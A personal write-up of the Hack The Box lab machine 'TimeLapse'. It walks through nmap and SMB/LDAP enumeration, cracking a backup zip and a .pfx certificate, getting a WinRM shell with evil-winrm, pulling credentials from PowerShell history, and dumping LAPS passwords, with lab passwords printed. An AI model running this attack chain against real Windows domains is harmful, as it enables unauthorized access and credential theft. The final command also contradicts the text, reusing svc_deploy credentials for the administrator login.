---
title: TimeLapse
draft: false
tags:
---
![[Timelapse.png|450]]![[Pasted image 20250306110638.png|200]]
Machine: https://app.hackthebox.com/machines/452

# Enumeration
## Port Scanning
- Getting the services and versions running 
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.11.152 -oG allPorts
```
>[!example]- Result
>![[Pasted image 20250306111155.png]]

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49693,49719,55625 -sCV -n -Pn --min-rate 5000 10.10.11.152 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250306111525.png]]

Name: `dc01.timelapse.htb`

## LDAP
- using [[ldapsearch]] in order to get all available information without credentials
```bash
ldapsearch -H ldap://10.10.11.152 -x -s base
```
>[!example]- Result
>![[Pasted image 20250306113215.png]]

- now using each naming context, but nothing
```bash
ldapsearch -H ldap://10.10.11.152 -x -b 'DC=timelapse,DC=htb'
```
>[!example]- Result
>![[Pasted image 20250306113701.png]]

## SMB
- Using [[smbclient]] we can get a list of shares using a null session
```bash
smbclient -L //10.10.11.152/ -N
```
>[!example]- Result
>![[Pasted image 20250306114609.png]]

- now using [[smbmap]] we can see the access rights 
```bash
smbmap -H 10.10.11.152 -u 'none'
```
>[!example]- Result
>![[Pasted image 20250306114703.png]]

- lets enumerate this resource 
```bash
smbclient //10.10.11.152/Shares -U 'none' -N
```
>[!example]- Result
>![[Pasted image 20250306120432.png]]

- we got this files
```smbClient
mget *
```
>[!example]- Result
>![[Pasted image 20250306120853.png]]

# Exploitation
- if we list the content of the `zip` file we found a `.pfx` (a type of file that contains private and public keys but are encrypted with a password)
```bash
7z l rm_backup.zip
```
>[!example]- Result
>![[Pasted image 20250306122748.png]]

- lets try to crack the file using [[fcrackzip]]
```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt rm_backup.zip
```
>[!example]- Result
>![[Pasted image 20250306150308.png]]

password:`supremelegacy`

```bash
unzip rm_backup.zip
```

- now we can try to open this file `.pfx` but as we now we need a password (its not the same of `.zip`)
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privateKey.pem -nodes
```
>[!example]- Result
>![[Pasted image 20250306151122.png]]

- we can use [[pfx2john]] in order to get a hash, or we can use [[crackpkcs12]]
```bash
crackpkcs12 -b -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx
```
>[!example]- Result
>![[Pasted image 20250306152121.png]]

password: `thuglegacy`
- Perfect now we can use this password, and get the Private key and the certificate
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privateKey.pem -nodes
```
>[!example]- Result
>![[Pasted image 20250306152235.png]]
>![[Pasted image 20250306152259.png]]

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
```
>[!example]- Result
>![[Pasted image 20250306152827.png]]

## Intrusion
- We have a private key and a certificate so if we check the opened port we can se that port `5986` is enabled, thats means that winrm is enabled but using ssl, we can try to use this files in order to get a revershell using [[evil-winrm]]
```bash
evil-winrm -c certificate.pem -S -k privateKey.pem -i 10.10.11.152
```
>[!example]- Result
>![[Pasted image 20250306154052.png]]

# Privilege Escalation
## Enumeration
- we can use [[PrivescCheck]] and try to get some info
```bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```
>[!example]- Result
>![[Pasted image 20250306155810.png]]
>![[Pasted image 20250306155844.png]]
>


- if we check the users we can see this
```bash
net users
```
>[!example]- Result
>![[Pasted image 20250306163551.png]]

- and if we check this user is part of the group `LAPS_READERS` (LAPS =   “Local Administrator Password Solution” so this users can read users password in AD), so this user is a nice target
```bash
net users svc_deploy
```
>[!example]- Result
>![[Pasted image 20250306171717.png]]

- If we check we see this credentials into the PowerShell history
```bash
cat $env:appdata/microsoft/windows/powershell/psreadline/consolehost_history.txt
```
>[!example]- Result
>![[Pasted image 20250306173535.png]]

credentials: `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`

- now we can get a connection using [[evil-winrm]] again (because is part of the remote management group)
```bash
evil-winrm -S -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152
```
>[!example]- Result
>![[Pasted image 20250306174121.png]]

- perfect now using this tool,[[Get-LAPSPasswords.ps1]], we can get the plain text passwords
```bash
. .\Get-LAPSPasswords.ps1
Get-LAPSPasswords
```
>[!example]- Result
>![[Pasted image 20250306175042.png]]

password:`TM&X]b{lu]&/Q{80QY)c2qp[`

- we try this password to get access to administrator user and we got access
```bash
evil-winrm -S -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152
```
>[!example]- Result
>![[Pasted image 20250306175458.png]]

